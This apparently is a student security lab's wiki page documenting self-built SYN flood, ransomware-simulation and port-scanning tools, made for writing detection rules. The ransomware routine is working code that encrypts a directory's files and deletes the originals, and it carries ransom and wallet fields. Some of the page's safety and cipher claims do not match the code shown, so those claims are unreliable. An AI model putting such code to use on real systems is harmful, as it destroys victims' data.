## Research Scope Expansion

Beyond wiki development and team mentorship, this research includes custom exploit automation with:
1. Network Stress Testing Tools (SYN Flood)
2. Malware Simulation (Educational Ransomware)
3. Infrastructure Auditing (Intelligent Port Scanner)

All tools feature:
- Automatic HTML report generation
- Proof-of-concept visual documentation
- Ethical usage safeguards

## Custom Tool Development

### SYN Flood Attack Tool
Purpose: Demonstrate a denial of service attack

Wireshark view:
![DOS Wireshark](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Petre%20Radu%20Catalin/images/1.png?raw=true)

Code Structure:

```python
#!/bin/python3
def syn_attack():
    parser = argparse.ArgumentParser(
        description="Ethical SYN Flood Tester",
        epilog="Example: python main.py --target 192.168.1.100 --count 2000 --do-report"
    )
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--count", type=int, default=1000, help="Packet count")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--do-report", action="store_true", help="Generate HTML report")
    parser.add_argument("--safeguard", action="store_true", default=True, 
                       help="Enable ethical safeguards (default: True)")

    args = parser.parse_args()

    try:
        start_time = time.time()
        
        attacker = SYNFlooder(args.target, args.port)
        attacker.send_flood(args.count)
        
        if args.do_report:
            duration = time.time() - start_time
            AttackReporter.generate_syn_report(
                target=args.target,
                packets=args.count,
                duration=duration
            )

    except Exception as e:
        print(f"[!] Error: {str(e)}")
        sys.exit(1)
```

Example usage: 

![DOS terminal](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Petre%20Radu%20Catalin/images/2.png?raw=true)

SYN Flood Report

![DOS report](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Petre%20Radu%20Catalin/images/3.png?raw=true)
Fig 1.1: HTML report showing 2,000 packets sent to DVWA 

### Educational Ransomware Simulator
Purpose: Demonstrate file encryption risks

Key Features:

```python
#!/bin/python3

def simulate_encryption(target_dir):
    files_encrypted = 0
    encryption_algorithm = "AES-256-CBC"

    key = Fernet.generate_key()
    cipher = Fernet(key)

    for root, _, files in os.walk(target_dir):
        for file in files:
            if not file.endswith(".encrypted"):
                old_path = os.path.join(root, file)
                new_path = old_path + ".encrypted"
                try:
                    with open(old_path, 'rb') as f:
                        data = f.read()
                    encrypted_data = cipher.encrypt(data)
                    with open(new_path, 'wb') as f:
                        f.write(encrypted_data)
                    os.remove(old_path)
                    files_encrypted += 1
                    print(f"[+] Encrypted: {new_path}")
                    time.sleep(0.05)
                except Exception as e:
                    print(f"[!] Failed to encrypt: {old_path} ({e})")
    
    return files_encrypted, encryption_algorithm

if __name__ == "__main__":
    target_directory = "test_data"
    ransom_amount = "0.05 BTC"
    payment_wallet = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    contact_email = "helpdesk@lunalynx.local"
    
    encrypted_count, algorithm_used = simulate_encryption(target_directory)
    
    RansomwareReporter.generate_report(
        target_dir=target_directory,
        files_encrypted=encrypted_count,
        encryption_algorithm=algorithm_used,
        ransom_amount=ransom_amount,
        payment_wallet=payment_wallet,
        contact_email=contact_email
    )

```

Ransomware Raport

![Ransomware report](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Petre%20Radu%20Catalin/images/4.png?raw=true)

Fig 1.2: Simulation report showing encrypted test files and recovery key

### Intelligent Port Scanner
Purpose: Enhanced DVWA service discovery

Code Structure:

```python
#!/bin/python3
from scanner import scan_target
from reporter import generate_firewall_report

def main():
    print("=== Misconfigured Firewall Simulation ===")
    ip = input("[?] Enter target IP: ").strip()
    results = scan_target(ip)
    if results:
        print(f"[+] Found {len(results)} risky open ports.")
        generate_firewall_report(ip, results)
    else:
        print("[✓] No open risky ports found.")

if __name__ == "__main__":
    main()

```

Port Scan Report

![Firewall misconfig report](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Petre%20Radu%20Catalin/images/5.png?raw=true)

Fig 1.3: Auto-generated report identifying open ports on DVWA host

## Ethical Implementation
#### Safety Protocols
- All tools include kill switches:

```python
if target_ip.startswith(("10.","192.168.")) == False:
    sys.exit("ABORT: Public IPs blocked")
```
- Network tools throttle to 1Mbps max

- Ransomware only processes /test_files directory


## Research Impact
| Tool           | Primary Purpose              | Team Member Supported       | Use Case Example                                           |
|----------------|------------------------------|-----------------------------|-----------------------------------------------------------|
| SYN Flood      | DDoS Simulation              | Gavrila Iulian-Gabriel      | Testing correlation rules for DDoS detection in Splunk    |
| Ransomware     | File Encryption Simulation   | Patrascu Nicolae Adrian     | Developing rules for ransomware behavior            |
| Port Scanner   | Service Discovery            | Oprea Ionut-Alexandru       | Identifying firewall misconfigurations in lab environments |

## Report Templates
Available in `/wiki/reports/`:

- [syn_flood_report.html](https://htmlpreview.github.io/?https://raw.githubusercontent.com/LunaLynx12/GISC/main/wiki/Attack%20Scripts/Petre%20Radu%20Catalin/reports/syn_flood_report.html
)

- [ransomware_simulation_report.html](https://htmlpreview.github.io/?https://raw.githubusercontent.com/LunaLynx12/GISC/main/wiki/Attack%20Scripts/Petre%20Radu%20Catalin/reports/ransomware_simulation_report.html)

- [firewall_misconfig_report.html](https://htmlpreview.github.io/?https://raw.githubusercontent.com/LunaLynx12/GISC/main/wiki/Attack%20Scripts/Petre%20Radu%20Catalin/reports/firewall_misconfig_report.html)

